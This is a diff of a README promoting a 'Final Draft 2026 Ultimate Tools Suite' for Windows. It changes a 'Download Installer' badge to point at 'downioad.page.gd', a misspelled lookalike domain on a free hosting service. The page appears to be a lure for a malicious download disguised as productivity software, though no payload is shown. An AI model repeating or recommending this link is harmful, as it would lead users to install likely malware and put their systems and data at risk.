@@ -2,7 +2,7 @@
 
 The Final Draft 2026 Ultimate Tools Suite is an all-in-one enhancement package designed for Windows desktop users who want to maximize their productivity with Final Draft. This toolkit offers a range of features that integrate smoothly with the 2026 version of the software, providing tools for template management, collaboration, and production tasks. Whether you're a professional writer or an enthusiast, these utilities will help streamline your creative process.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
